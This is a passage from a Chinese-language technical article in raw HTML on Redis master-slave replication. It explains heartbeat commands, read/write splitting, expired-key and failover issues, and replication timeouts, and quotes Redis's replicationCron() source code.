src=\"http://jbcdn2.b0.upaiyun.com/2018/07/15bc8cfb447fd80e86a47ba186441f6d.png\" alt=\"\"></p>\n<p>但是根据该参数的名称(含有ping-slave)，以及代码实现，我认为该PING命令是主节点发给从节点的。相关代码如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6aecaca87b37a8733c5dad783a80c2b0.png\" alt=\"\"></p>\n<h2>2. 从-&gt;主：REPLCONF ACK</h2>\n<p>在命令传播阶段，<strong>从节点会向主节点发送</strong><strong>REPLCONF ACK</strong><strong>命令，</strong>频率是每秒1次；命令格式为：REPLCONF ACK {offset}，其中offset指从节点保存的复制偏移量。REPLCONF ACK命令的作用包括：</p>\n<p>（1）实时监测主从节点网络状态：该命令会被主节点用于复制超时的判断。此外，在主节点中使用info Replication，可以看到其从节点的状态中的lag值，代表的是主节点上次收到该REPLCONF ACK命令的时间间隔，在正常情况下，该值应该是0或1，如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/ad2eb70149ddbd2771b606ea69192084.png\" alt=\"\"></p>\n<p>（2）检测命令丢失：从节点发送了自身的offset，主节点会与自己的offset对比，如果从节点数据缺失（如网络丢包），主节点会推送缺失的数据（这里也会利用复制积压缓冲区）。<strong>注意，</strong><strong>offset</strong><strong>和复制积压缓冲区，不仅可以用于部分复制，也可以用于处理命令丢失等情形；区别在于前者是在断线重连后进行的，而后者是在主从节点没有断线的情况下进行的。</strong></p>\n<p>（3）辅助保证从节点的数量和延迟：Redis主节点中使用min-slaves-to-write和min-slaves-max-lag参数，来保证主节点在不安全的情况下不会执行写命令；所谓不安全，是指从节点数量太少，或延迟过高。例如min-slaves-to-write和min-slaves-max-lag分别是3和10，含义是如果从节点数量小于3个，或所有从节点的延迟值都大于10s，则主节点拒绝执行写命令。而这里从节点延迟值的获取，就是通过主节点接收到REPLCONF ACK命令的时间来判断的，即前面所说的info Replication中的lag值。</p>\n<h1>六、应用中的问题</h1>\n<h2>1. 读写分离及其中的问题</h2>\n<p>在主从复制基础上实现的读写分离，可以实现Redis的读负载均衡：由主节点提供写服务，由一个或多个从节点提供读服务（多个从节点既可以提高数据冗余程度，也可以最大化读负载能力）；在读负载较大的应用场景下，可以大大提高Redis服务器的并发量。下面介绍在使用Redis读写分离时，需要注意的问题。</p>\n<h3>（1）延迟与不一致问题</h3>\n<p>前面已经讲到，由于主从复制的命令传播是异步的，延迟与数据的不一致不可避免。如果应用对数据不一致的接受程度程度较低，可能的优化措施包括：优化主从节点之间的网络环境（如在同机房部署）；监控主从节点延迟（通过offset）判断，如果从节点延迟过大，通知应用不再通过该从节点读取数据；使用集群同时扩展写负载和读负载等。</p>\n<p>在命令传播阶段以外的其他情况下，从节点的数据不一致可能更加严重，例如连接在数据同步阶段，或从节点失去与主节点的连接时等。从节点的slave-serve-stale-data参数便与此有关：它控制这种情况下从节点的表现；如果为yes（默认值），则从节点仍能够响应客户端的命令，如果为no，则从节点只能响应info、slaveof等少数命令。该参数的设置与应用对数据一致性的要求有关；如果对数据一致性要求很高，则应设置为no。</p>\n<h3>（2）数据过期问题</h3>\n<p>在单机版Redis中，存在两种删除策略：</p>\n<ul>\n<li>惰性删除：服务器不会主动删除数据，只有当客户端查询某个数据时，服务器判断该数据是否过期，如果过期则删除。</li>\n<li>定期删除：服务器执行定时任务删除过期数据，但是考虑到内存和CPU的折中（删除会释放内存，但是频繁的删除操作对CPU不友好），该删除的频率和执行时间都受到了限制。</li>\n</ul>\n<p>在主从复制场景下，为了主从节点的数据一致性，从节点不会主动删除数据，而是由主节点控制从节点中过期数据的删除。由于主节点的惰性删除和定期删除策略，都不能保证主节点及时对过期数据执行删除操作，因此，当客户端通过Redis从节点读取数据时，很容易读取到已经过期的数据。</p>\n<p>Redis 3.2中，从节点在读取数据时，增加了对数据是否过期的判断：如果该数据已过期，则不返回给客户端；将Redis升级到3.2可以解决数据过期问题。</p>\n<h3>（3）故障切换问题</h3>\n<p>在没有使用哨兵的读写分离场景下，应用针对读和写分别连接不同的Redis节点；当主节点或从节点出现问题而发生更改时，需要及时修改应用程序读写Redis数据的连接；连接的切换可以手动进行，或者自己写监控程序进行切换，但前者响应慢、容易出错，后者实现复杂，成本都不算低。</p>\n<h3>（4）总结</h3>\n<p>在使用读写分离之前，可以考虑其他方法增加Redis的读负载能力：如尽量优化主节点（减少慢查询、减少持久化等其他情况带来的阻塞等）提高负载能力；使用Redis集群同时提高读负载能力和写负载能力等。如果使用读写分离，可以使用哨兵，使主从节点的故障切换尽可能自动化，并减少对应用程序的侵入。</p>\n<h2>2. 复制超时问题</h2>\n<p>主从节点复制超时是导致复制中断的最重要的原因之一，本小节单独说明超时问题，下一小节说明其他会导致复制中断的问题。</p>\n<p><strong>超时判断意义</strong></p>\n<p>在复制连接建立过程中及之后，主从节点都有机制判断连接是否超时，其意义在于：</p>\n<p>（1）如果主节点判断连接超时，其会释放相应从节点的连接，从而释放各种资源，否则无效的从节点仍会占用主节点的各种资源（输出缓冲区、带宽、连接等）；此外连接超时的判断可以让主节点更准确的知道当前有效从节点的个数，有助于保证数据安全（配合前面讲到的min-slaves-to-write等参数）。</p>\n<p>（2）如果从节点判断连接超时，则可以及时重新建立连接，避免与主节点数据长期的不一致。</p>\n<p><strong>判断机制</strong></p>\n<p>主从复制超时判断的核心，在于repl-timeout参数，该参数规定了超时时间的阈值（默认60s），对于主节点和从节点同时有效；主从节点触发超时的条件分别如下：</p>\n<p>（1）主节点：每秒1次调用复制定时函数replicationCron()，在其中判断当前时间距离上次收到各个从节点REPLCONF ACK的时间，是否超过了repl-timeout值，如果超过了则释放相应从节点的连接。</p>\n<p>（2）从节点：从节点对超时的判断同样是在复制定时函数中判断，基本逻辑是：</p>\n<ul>\n<li>如果当前处于连接建立阶段，且距离上次收到主节点的信息的时间已超过repl-timeout，则释放与主节点的连接；</li>\n<li>如果当前处于数据同步阶段，且收到主节点的RDB文件的时间超时，则停止数据同步，释放连接；</li>\n<li>如果当前处于命令传播阶段，且距离上次收到主节点的PING命令或数据的时间已超过repl-timeout值，则释放与主节点的连接。</li>\n</ul>\n<p>主从节点判断连接超时的相关源代码如下：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a2971722378847872\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/* Replication cron function, called 1 time per second. */\r\nvoid replicationCron(void) {\r\n    static long long replication_cron_loops = 0;\r\n\r\n    /* Non blocking connection timeout? */\r\n    if (server.masterhost &amp;&amp;\r\n        (server.repl_state == REDIS_REPL_CONNECTING ||\r\n         slaveIsInHandshakeState()) &amp;&amp;\r\n         (time(NULL)-server.repl_transfer_lastio) &gt; server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"Timeout connecting to the MASTER...\");\r\n        undoConnectWithMaster();\r\n    }\r\n\r\n    /* Bulk transfer I/O timeout? */\r\n    if (server.masterhost &amp;&amp; server.repl_state == REDIS_REPL_TRANSFER &amp;&amp;\r\n        (time(NULL)-server.repl_transfer_lastio) &gt; server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"Timeout receiving bulk data from MASTER... If the problem persists try to set the 'repl-timeout' parameter in redis.conf to a larger value.\");\r\n        replicationAbortSyncTransfer();\r\n    }\r\n\r\n    /* Timed out master when we are an already connected slave? */\r\n    if (server.masterhost &amp;&amp; server.repl_state == REDIS_REPL_CONNECTED &amp;&amp;\r\n        (time(NULL)-server.master-&gt;lastinteraction) &gt; server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"MASTER timeout: no data nor PING received...\");\r\n        freeClient(server.master);\r\n    }\r\n\r\n    //此处省略无关代码……\r\n\r\n    /* Disconnect timedout slaves. */\r\n    if (listLength(server.slaves)) {\r\n        listIter li;\r\n        listNode *ln;\r\n        listRewind(server.slaves,&amp;li);\r\n        while((ln = listNext(&amp;li))) {\r\n            redisClient *slave = ln-&gt;value;\r\n            if (slave-&gt;replstate != REDIS_REPL_ONLINE) continue;\r\n            if (slave-&gt;flags &amp; REDIS_PRE_PSYNC) continue;\r\n            if ((server.unixtime - slave-&gt;repl_ack_time) &gt; server.repl_timeout)\r\n            {\r\n                redisLog(REDIS_WARNING, \"Disconnecting timedout slave: %s\",\r\n                    replicationGetSlaveName(slave));\r\n                freeClient(slave);\r\n            }\r\n        }\r\n    }\r\n\r\n    //此处省略无关代码……\r\n\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a2971722378847872-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a2971722378847872-53\">53</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-1\"><span class=\"crayon-c\">/* Replication cron function, called 1 time per second. */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-2\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">replicationCron</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">replication_cron_loops</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Non blocking connection timeout? */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">masterhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_CONNECTING</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-8\"><span class=\"crayon-h\">         </span><span class=\"crayon-e\">slaveIsInHandshakeState</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-9\"><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_transfer_lastio</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Timeout connecting to the MASTER...\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">undoConnectWithMaster</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-14\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Bulk transfer I/O timeout? */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">masterhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_TRANSFER</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_transfer_lastio</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Timeout receiving bulk data from MASTER... If the problem persists try to set the 'repl-timeout' parameter in redis.conf to a larger value.\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">replicationAbortSyncTransfer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-22\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Timed out master when we are an already connected slave? */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">masterhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_CONNECTED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">master</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">lastinteraction</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"MASTER timeout: no data nor PING received...\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">freeClient</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">master</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-30\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//此处省略无关代码……</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-32\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Disconnect timedout slaves. */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">listLength</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">slaves</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-35\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">listIter </span><span class=\"crayon-v\">li</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-36\"><span class=\"crayon-h\">        </span><span class=\"crayon-e \">listNode *</span><span class=\"crayon-v\">ln</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-37\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">listRewind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">slaves</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">li</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ln</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">listNext</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">li</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-39\"><span class=\"crayon-h\">            </span><span class=\"crayon-e \">redisClient *</span><span class=\"crayon-v\">slave</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ln</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-40\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">replstate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_ONLINE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">continue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-41\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">flags</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_PRE_PSYNC</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">continue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-42\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span 